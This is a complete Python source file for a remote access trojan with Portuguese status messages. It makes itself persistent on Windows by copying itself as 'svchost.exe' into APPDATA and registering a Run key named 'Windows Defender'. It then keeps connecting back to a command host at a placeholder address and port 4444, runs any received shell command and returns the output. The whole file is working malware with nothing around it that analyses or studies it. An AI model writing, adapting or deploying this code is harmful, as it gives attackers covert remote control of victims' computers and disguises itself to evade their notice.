import os, sys, socket, subprocess, threading, time, random, shutil, ctypes

C = "127.0.0.1"
P = 4444

def survive():
    try:
        if os.name == "nt":
            path = os.getenv('APPDATA') + r"\Microsoft\svchost.exe"
            if not os.path.exists(path):
                shutil.copy(sys.executable, path)
                subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Windows Defender" /t REG_SZ /d "{path}" /f', shell=True)
    except: pass

def rat():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as z:
                z.connect((C, P))
                z.send(b" implantado com sucesso")
                while True:
                    cmd = z.recv(8192).decode(errors='ignore').strip()
                    if not cmd: continue
                    if cmd.startswith("cd "):
                        try: os.chdir(cmd[3:])
                        except: z.send(b"Erro no cd")
                    elif cmd == "exit":
                        break
                    else:
                        try:
                            out = subprocess.getoutput(cmd)
                            z.send((out or "OK").encode(errors='ignore'))
                        except:
                            z.send(b"Erro na execução")
        except:
            time.sleep(random.randint(3,12))

survive()
threading.Thread(target=rat, daemon=True).start()

print(" Core carregado")
while True:
    time.sleep(300)